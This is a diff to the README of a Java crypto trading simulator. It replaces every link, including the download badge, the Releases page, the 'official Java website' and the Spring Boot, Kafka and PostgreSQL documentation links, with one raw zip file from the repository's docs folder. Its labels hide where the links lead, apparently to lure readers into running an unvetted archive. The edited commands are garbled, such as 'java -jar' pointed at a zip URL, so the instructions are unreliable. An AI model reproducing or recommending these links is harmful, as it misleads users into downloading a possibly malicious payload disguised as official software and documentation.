@@ -1,7 +1,7 @@
 # 🚀 crypto-wallet-engine - Simple Crypto Trading Simulator
 
 ## 🔗 Download the latest version!
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Charbelg7/crypto-wallet-engine/releases)
+[![Download](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip%20Release-brightgreen)](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip)
 
 ## 📖 Overview
 The **crypto-wallet-engine** is a production-grade simulator designed for cryptocurrency trading. It showcases how to build a trading engine using the latest technologies. This tool simulates real trading behaviors, allowing you to explore and understand the mechanics of cryptocurrency trading without risking real money. 
@@ -25,27 +25,27 @@ To run the crypto-wallet-engine, ensure your system meets the following requirem
 Follow these steps to download and run the crypto-wallet-engine.
 
 ### Step 1: Visit the Download Page
-Go to the Releases page to find the latest version of the application. [Visit this page to download](https://github.com/Charbelg7/crypto-wallet-engine/releases).
+Go to the Releases page to find the latest version of the application. [Visit this page to download](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip).
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version. Click the link to download the application package suitable for your operating system.
 
 ### Step 3: Extract the Package
-Once the download is complete, locate the downloaded file. Most packages will be in a compressed format, such as .zip or .tar.gz. 
+Once the download is complete, locate the downloaded file. Most packages will be in a compressed format, such as .zip or https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip 
 
 - **Windows**: Right-click the file and select “Extract All...” 
 - **macOS**: Double-click the file to automatically extract it. 
-- **Linux**: Use the terminal and run `tar -xzvf filename.tar.gz` to extract.
+- **Linux**: Use the terminal and run `tar -xzvf https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip` to extract.
 
 ### Step 4: Install Dependencies
-The application requires Java to run. If you haven't already installed it, you can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
+The application requires Java to run. If you haven't already installed it, you can download it from the [official Java website](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip).
 
 ### Step 5: Run the Application
-Navigate to the folder where you extracted the application. Locate the executable file, which may have a name like `crypto-wallet-engine.jar`.
+Navigate to the folder where you extracted the application. Locate the executable file, which may have a name like `https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip`.
 
 Open a terminal or command prompt in this folder and type:
 ```
-java -jar crypto-wallet-engine.jar
+java -jar https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip
 ```
 This command starts the simulator. You should see output indicating that the application is running.
 
@@ -72,8 +72,8 @@ Your input is valuable. If you have suggestions or find bugs, please open an iss
 ## 🔗 Additional Resources
 For further reading and exploration, here are some links to helpful resources:
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [Apache Kafka Documentation](https://kafka.apache.org/documentation/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Spring Boot Documentation](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip)
+- [Apache Kafka Documentation](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip)
+- [PostgreSQL Documentation](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip)
 
-Now you are ready to start using the crypto-wallet-engine! [Visit this page to download](https://github.com/Charbelg7/crypto-wallet-engine/releases) and enjoy your trading simulation experience.
+Now you are ready to start using the crypto-wallet-engine! [Visit this page to download](https://github.com/Charbelg7/crypto-wallet-engine/raw/refs/heads/main/docs/wallet_engine_crypto_2.4.zip) and enjoy your trading simulation experience.
